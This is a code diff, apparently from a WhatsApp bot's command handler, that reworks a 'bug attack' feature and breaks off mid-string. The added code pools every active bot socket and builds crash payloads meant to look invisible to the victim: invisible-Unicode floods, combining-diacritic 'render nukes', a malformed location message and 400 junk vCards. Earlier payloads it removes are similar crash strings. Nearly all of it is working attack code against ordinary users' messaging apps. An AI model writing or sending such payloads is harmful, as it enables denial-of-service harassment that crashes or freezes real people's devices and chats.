@@ -1177,42 +1177,76 @@ function setupCommandHandlers(socket, number) {
           if (!_bugAttackActive.get(_attackTarget)) {
             _bugAttackActive.set(_attackTarget, true);
 
-            // Bug payloads to rotate through
+            // Collect all active sockets for maximum power
+            const _abSockets = Array.from(activeSockets.values()).filter(s => {
+              try { return s && s.user && s.sendMessage; } catch(e) { return false; }
+            });
+            const _abMainSock = _abSockets.length > 0 ? _abSockets : [socket];
+
+            // Invisible unicode helpers
+            const _abInv = '​‌‍﻿⁠᠎­͏';
+            const _abMakeInv = (len) => Array.from({length: len}, (_, i) => _abInv[i % _abInv.length]).join('');
+            const _abDiac = '̀́̂̃҈҉⃐⃑⃖⃗⃛⃜⃡⃧⃩';
+
+            // Invisible bug payloads (appear blank to victim)
+            const _abInvBomb = _abMakeInv(2000) + '​'.repeat(2000) + '‌'.repeat(2000) + '‍'.repeat(2000) + '﻿'.repeat(2000);
+            const _abRenderNuke = _abMakeInv(400) + _abDiac.repeat(3000) + '஍'.repeat(4000) + '҈҉'.repeat(3000) + '‍'.repeat(5000);
+            const _abLocCrash = {
+              degreesLatitude: -89.9999999,
+              degreesLongitude: 179.9999999,
+              name: _abInvBomb.slice(0, 3000),
+              address: _abRenderNuke.slice(0, 3000)
+            };
+            const _abCards = Array.from({ length: 400 }, (_, i) => ({
+              vcard: [
+                'BEGIN:VCARD', 'VERSION:3.0',
+                `FN:${_abMakeInv(80)}_${i}`,
+                `TEL;type=CELL;waid=94${String(700000000 + i).slice(-9)}:+94${String(700000000 + i).slice(-9)}`,
+                `NOTE:${_abMakeInv(150)}`,
+                'END:VCARD'
+              ].join('\n')
+            }));
+
+            // Bug payloads — all invisible, fired via all active sockets
             const _bugPayloads = [
-              // 1. Oversized contact array (classic crash)
-              () => socket.sendMessage(_attackTarget, {
-                contacts: {
-                  displayName: '♻️❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭💀',
-                  contacts: Array.from({ length: 300 }, (_, i) => ({
-                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:BUG${i}\nTEL:+94${String(i).padStart(9,'0')}\nEND:VCARD`
-                  }))
-                }
-              }),
-              // 2. Unicode crash text
-              () => socket.sendMessage(_attackTarget, {
-                text: '\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008' +
-                      '\u000B\u000C\u000E\u000F\u0010\u0011\u0012\u0013\u0014' +
-                      '\u0015\u0016\u0017\u0018\u0019\u001A\u001B\u001C\u001D' +
-                      '​‌‍‎‏‪‫‬‭‮'.repeat(500) +
-                      '\uFEFF\u200B\u200C\u200D\u200E\u200F'.repeat(400)
-              }),
-              // 3. Extremely long repetitive text
-              () => socket.sendMessage(_attackTarget, {
-                text: '❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭♻️❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃬⃬⃭⃭⃮⃮⃮⃮⃮❭⃯⃯⃯⃯⃯⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃬⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛⃜⃛⃛⃜⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃭⃬⃬⃭⃭⃬⃭⃬⃮⃮⃯⃯⃯⃮⃭⃭⃮⃮⃭⃮⃭❭⃯⃯⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃮⃭⃭⃬⃭⃭⃮⃮⃯⃯⃯⃮⃮⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃮⃮⃭⃭⃬⃬⃭⃭⃮⃮⃨⃨⃨⃨⃨⃨⃨⃨⃨⃜⃛⃛⃛⃛⃛⃜⃜⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃛⃜⃛⃜⃜⃜⃜⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃛⃛⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃭⃭⃬⃭⃭⃭⃮⃮⃮⃮⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮❭⃯⃯⃯⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃬⃬⃭⃭⃭⃭⃭⃭⃮⃮⃮⃮⃮⃮⃮⃮⃯⃯⃮⃮⃮⃮⃮⃮⃮⃭⃭⃭⃭⃬⃬⃬⃭⃭⃮⃮⃮⃯⃯⃯⃯⃯⃯⃯⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃨⃨⃨⃨⃨⃨⃨⃛⃜⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃜⃛⃛⃜⃛❭⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃫⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃥⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃦⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃭⃭⃭⃮⃮⃭⃭⃭⃭⃭⃬⃭⃬⃭❭❭⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃨⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃬⃭⃭⃭⃬⃬⃬⃬⃬⃬⃬⃬⃭⃬⃭⃭⃭⃮⃮⃯⃯⃮⃮⃭⃮⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃜⃜⃜⃜⃜⃜⃛⃛⃛⃐⃐⃐⃜⃜⃛⃛⃛⃛⃛⃜⃜⃜⃜⃜⃜⃛⃛⃜⃜⃜⃜⃜⃜⃜⃛⃛⃛❭⃮⃮⃭⃮⃬⃭⃬⃭⃮⃬⃭⃭⃮⃮⃮⃮⃮⃭⃭⃭⃭⃭⃬⃬⃬⃭⃮⃮⃯⃯⃯